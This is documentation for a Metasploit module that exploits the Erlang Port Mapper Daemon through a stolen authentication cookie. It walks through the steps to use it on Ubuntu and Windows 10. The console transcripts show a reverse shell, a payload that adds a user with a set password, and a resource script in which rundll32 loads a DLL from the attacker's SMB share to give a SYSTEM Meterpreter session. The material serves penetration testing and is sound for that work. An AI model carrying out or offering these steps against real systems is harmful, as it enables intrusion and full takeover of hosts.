## Vulnerable Application

  The [Erlang Port Mapper Daemon](https://www.erlang.org/) is used to coordinate distributed erlang
  instances. Should an attacker get the authentication cookie code execution is trivial. Normally this
  cookie can be found in the home directory as ".erlang.cookie", however it varies system to system
  as well as its configuration. As an example on a Windows 10 instance it can be found under the
  users home directory: e.g `C:\Users\<USER>\.erlang.cookie`. Code execution is achieved via the
  `os:cmd('cmd').` command

## Verification Steps
  
  1. Install the Erlang Port Mapper Daemon
  2. Install RabbitMQ
  3. Start `msfconsole`
  4. Do `use exploit/multi/misc/erlang_cookie_rce`
  5. Do `set RHOST <ip>`
  6. Do `set COOKIE <cookie>`
  7. Do `set TARGET <target>`
  8. Do `set LHOST <host>`
  9. `exploit` and verify shell is opened (if on windows login)

## Scenarios

### Ubuntu 16.04.5 LTS

```
msf exploit(multi/misc/erlang_cookie_rce) > options 

Module options (exploit/multi/misc/erlang_cookie_rce):

   Name    Current Setting       Required  Description
   ----    ---------------       --------  -----------
   COOKIE  EXAMPLE               yes       Erlang cookie to login with
   RHOST   A.B.C.D               yes       The target address
   RPORT   25672                 yes       The target port (TCP)


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  W.X.Y.Z          yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Unix


msf exploit(multi/misc/erlang_cookie_rce) > exploit

[*] Started reverse TCP double handler on W.X.Y.Z:4444 
[*] A.B.C.D:25672 - Receiving server challenge
[*] A.B.C.D:25672 - Sending challenge reply
[+] A.B.C.D:25672 - Authentication successful, sending payload
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo XinIWxzXWDO5x9EM;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "XinIWxzXWDO5x9EM\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (W.X.Y.Z:4444 -> A.B.C.D:46410) at 2018-12-09 14:45:47 -0600

id
uid=122(rabbitmq) gid=130(rabbitmq) groups=130(rabbitmq)
```

### Windows 10 (Build 17134)

First we want to exploit the host, as an example adding a new user. (Payload is executed over cmd.exe)

```
msf exploit(multi/misc/erlang_cookie_rce) > options 

Module options (exploit/multi/misc/erlang_cookie_rce):

   Name    Current Setting       Required  Description
   ----    ---------------       --------  -----------
   COOKIE  EXAMPLE               yes       Erlang cookie to login with
   RHOST   A.B.C.D               yes       The target address
   RPORT   25672                 yes       The target port (TCP)


Payload options (cmd/windows/adduser):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   CUSTOM                   no        Custom group name to be used instead of default
   PASS    Wetw0rkHax0r$1   yes       The password for this user
   USER    wetw0rk          yes       The username to create
   WMIC    false            yes       Use WMIC on the target to resolve administrators group


Exploit target:

   Id  Name
   --  ----
   1   Windows


msf exploit(multi/misc/erlang_cookie_rce) > exploit

[*] A.B.C.D:25672 - Receiving server challenge
[*] A.B.C.D:25672 - Sending challenge reply
[+] A.B.C.D:25672 - Authentication successful, sending payload
[*] Exploit completed, but no session was created.
```

Once exploitation is complete the tester can authenticate. Another method that can be used is SMB as shown below.

exploit.rc ->

```
use exploit/windows/smb/smb_delivery
set SHARE MSF
set TARGET 0
exploit -j
use exploit/multi/misc/erlang_cookie_rce
set COOKIE EXAMPLE
set TARGET 1
set RHOST A.B.C.D
set PAYLOAD cmd/windows/generic
set CMD "rundll32.exe \\\\W.X.Y.Z\MSF\test.dll,0"
exploit -j
```

```
msf > resource exploit.rc
[*] Processing /root/exploit.rc for ERB directives.
[*] Exploit running as background job 0.
[*] Started reverse TCP handler on W.X.Y.Z:4444 
[*] Started service listener on W.X.Y.Z:445 
[*] Server started.
[*] Run the following command on the target machine: rundll32.exe \\W.X.Y.Z\MSF\test.dll,0
[*] Exploit running as background job 1.
[*] A.B.C.D:25672 - Receiving server challenge
[*] A.B.C.D:25672 - Sending challenge reply
[+] A.B.C.D:25672 - Authentication successful, sending payload
[*] Sending stage (179779 bytes) to A.B.C.D
[*] Meterpreter session 1 opened (W.X.Y.Z:4444 -> A.B.C.D:51856) at 2018-12-18 14:45:02 -0600
[*] Exploit completed, but no session was created.
msf exploit(multi/misc/erlang_cookie_rce) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
